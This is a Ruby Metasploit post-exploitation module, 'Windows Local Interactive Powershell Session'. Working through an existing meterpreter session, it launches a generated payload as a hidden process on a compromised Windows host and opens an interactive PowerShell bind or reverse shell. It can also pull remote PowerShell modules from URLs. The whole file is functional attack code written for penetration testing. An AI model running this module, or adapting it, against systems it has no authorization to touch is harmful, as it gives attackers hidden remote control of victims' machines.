##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Local

  def initialize(info = {})
    super(update_info(info,
      'Name'                 => "Windows Local Interactive Powershell Session",
      'Description'          => %q(
        This module will start a new interactive PowerShell bind session. A list of
        modules (comma separated) can be supplied in the LOAD_MODULES option to import
        into the interactive session. E.g. http://site/p1.ps1,http://site/p2.ps1
        Use a meterpreter route to ensure you can gain access to the bind port.
      ),
      'License'              => MSF_LICENSE,
      'Platform'             => ['win'],
      'SessionTypes'         => ['meterpreter'],
      'DisclosureDate'       => 'Apr 15 2015',
      'Author'        =>
        [
          'Ben Turner', # benpturner
          'Dave Hardy' # davehardy20
        ],
      'References'    =>
        [
          ['URL', 'https://www.nettitude.co.uk/interactive-powershell-session-via-metasploit/']
        ],
      'Payload'        =>
        {
          'Compat' =>
          {
            'PayloadType'    => 'cmd_interact',
            'ConnectionType' => 'find'
          }
        },
      'Arch'          => [ ARCH_CMD ],
      'Targets'       =>
        [
          [ 'Windows', {} ]
        ],
      'DefaultTarget'  => 0
    ))

  end

  def exploit
    rhost = datastore['RHOST']
    lhost = datastore['LHOST']
    lport = datastore['LPORT']
    payload = datastore['PAYLOAD']

    # sysinfo is only on meterpreter sessions
    vprint_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?

    # Check that the payload is a Windows one and on the list
    if not session.framework.payloads.keys.grep(/windows/).include?(datastore['PAYLOAD'])
      print_error("The Payload specified #{datastore['PAYLOAD']} is not a valid for this system")
      return
    end

    raw = generate_payload.raw
    res = session.sys.process.execute("#{raw}", nil, 'Hidden' => true, 'Channelized' => false)
    fail_with(Failure::Unknown,'Failed to start powershell process') unless res && res.pid
    computer_name = session.sys.config.sysinfo['Computer']
    vprint_status("Started PowerShell on #{computer_name} - PID: #{res.pid}")

    if session.framework.payloads.keys.grep(/bind/).include?(datastore['PAYLOAD'])
      print_status("Attemping to connect to #{rhost}:#{lport}...")
    else
      print_status("Waiting for connection from #{rhost}:#{lport}...")
    end
  end
end
